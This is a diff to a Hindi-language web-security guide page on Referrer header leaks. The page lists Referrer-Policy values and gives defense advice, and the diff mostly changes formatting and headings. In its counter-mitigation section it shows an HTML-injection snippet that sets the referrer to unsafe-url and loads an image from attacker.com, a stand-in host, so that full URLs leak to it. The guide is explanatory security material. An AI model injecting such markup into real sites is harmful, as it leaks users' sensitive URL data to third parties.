@@ -10,7 +10,7 @@ Referrer वह हेडर है जिसका उपयोग ब्रा
 
 ## शमन
 
-आप ब्राउज़र को एक **Referrer-policy** का पालन करने के लिए कह सकते हैं जो **संवेदनशील जानकारी** को अन्य वेब अनुप्रयोगों में भेजने से **बचा** सकता है:
+आप ब्राउज़र को एक **Referrer-policy** का पालन करने के लिए कह सकते हैं जो संवेदनशील जानकारी को अन्य वेब अनुप्रयोगों में भेजने से **बचा** सकता है:
 ```
 Referrer-Policy: no-referrer
 Referrer-Policy: no-referrer-when-downgrade
@@ -21,14 +21,14 @@ Referrer-Policy: strict-origin
 Referrer-Policy: strict-origin-when-cross-origin
 Referrer-Policy: unsafe-url
 ```
-## काउंटर-निवारण
+## Counter-Mitigation
 
-आप इस नियम को एक HTML मेटा टैग का उपयोग करके ओवरराइड कर सकते हैं (हमलावर को एक HTML इंजेक्शन का शोषण करने की आवश्यकता है):
-```markup
+आप इस नियम को एक HTML मेटा टैग का उपयोग करके ओवरराइड कर सकते हैं (हमलावर को एक HTML इंजेक्शन का लाभ उठाने की आवश्यकता है):
+```html
 <meta name="referrer" content="unsafe-url">
 <img src="https://attacker.com">
 ```
-## रक्षा
+## Defense
 
 कभी भी किसी संवेदनशील डेटा को GET पैरामीटर या URL में पथ के अंदर न रखें।
 
